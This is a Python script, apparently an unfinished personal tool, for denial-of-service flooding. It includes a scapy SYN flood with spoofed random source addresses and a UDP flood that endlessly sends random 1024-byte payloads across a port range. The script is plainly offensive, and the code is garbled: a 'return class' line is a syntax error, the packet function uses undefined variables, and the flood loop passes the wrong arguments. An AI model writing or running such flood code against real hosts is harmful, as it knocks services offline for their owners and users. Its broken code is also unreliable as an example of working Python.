#!/usr/bin/env python3
from socket import socket, AF_INET, SOCK_DGRAM
from random import _urandom, randint
from sys import argv
from os import fork

from scapy.all import *
from subprocess import run
from multiprocessing import Pool
from joblib import Parallel, delayed

def randomIP():
    return class fake_src:
    def __init__(self):
        self.ip = [".".join(str(randint(0,255))for i in range(4))]
        self.port = randint(1,65535)

    flags = {
            'A': 'ACK',
            'C': 'CWR',
            'E': 'ECE',
            'F': 'FIN',
            'P': 'PSH',
            'S': 'SYN',
            'R': 'RST',
            'U': 'URG',
            }
class fake_syn:
    def __init__(self, flag):
        self.sqnc = randint(1,65535)
        self.wnd = randint(1,65535)
        self.mtu = 1500 #bytes
        self.flag = flag

def send_syn(src,dest,syn_pkt):
    d_ip, d_port = dest.split(':')
    IP = IP()
    TCP_Packet = TCP()	
    TCP_Packet.sport = src.port
    TCP_Packet.dport = int(d_port)
    TCP_Packet.flags = "S"
    TCP_Packet.seq = s_eq
    TCP_Packet.window = w_indow

    send(IP_Packet/TCP_Packet, verbose=0)

def syn_flood(func,num_jobs):
    while 1:
        Parallel(n_jobs=num_jobs)(delayed(func) for i in range(num_jobs))

#if __name__ == "__main__":
#    dstIP,dstPort = argv[1], int(argv[2])
#    num_pkts = argv[3]
#    syn_flood(send_syn(dstIP,dstPort), int(num_pkts))

def udp_flood(ip, port_range, verbose = False):
    S = socket(AF_INET, SOCK_DGRAM)
    start = int(port_range[0])
    end = int(port_range[1])
    j = 1

    while 1:
        [S.sendto(_urandom(1024),(ip,start)) for start in range(start,end)]
        if verbose: print('Flooded ports %d - %d, %d times' % (start, end, j)) 
        else: continue
        j += 1 

    return
if __name__ == "__main__":
    #udp_flood(argv[1],[argv[2],argv[3]],True)
    print(randomIP())
